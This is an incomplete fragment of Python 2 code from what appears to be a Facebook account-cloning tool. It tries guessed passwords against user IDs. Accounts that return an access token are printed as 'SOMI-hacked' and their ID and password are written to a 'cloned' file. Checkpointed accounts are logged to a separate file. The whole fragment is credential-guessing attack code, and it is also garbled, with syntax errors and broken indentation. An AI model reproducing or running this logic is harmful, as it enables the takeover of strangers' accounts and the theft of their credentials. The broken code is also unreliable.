	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m[SOMI-hacked]  ' + k + c + user + '  |  ' + pass1  + op["name"]
				okb = open('save/cloned.txt', 'a')
				okb.write("ID:" k+c+user+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;93m[open after 7 days] ' + k + c + user + '  |  ' + pass1. + op["name"]
					cps = open('out/super_cp.txt', 'a')
					cps.write("ID:" k+c+user+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m[SOMI-hacked]  '+ k + c + user + '  |  ' + pass2	+ op["name"]																
 				        okb = open('save/cloned.txt', 'a')
 				        okb.write("ID:" k+c+user+pass2+'\n')
 				        okb.close()
 				        oks.append(c+user+pass2)
 				    else:
 				        if 'www.facebook.com' in q['error_msg']:
 					    	print '\033[1;93m[open after 7 days] '+ k + c + user + '  |  ' + pass2	+ op["name"]
 					        cps = open('out/super_cp.txt', 'a')
 					        cps.write("ID:" k+c+user+pass2+'\n')
 					        cps.close()
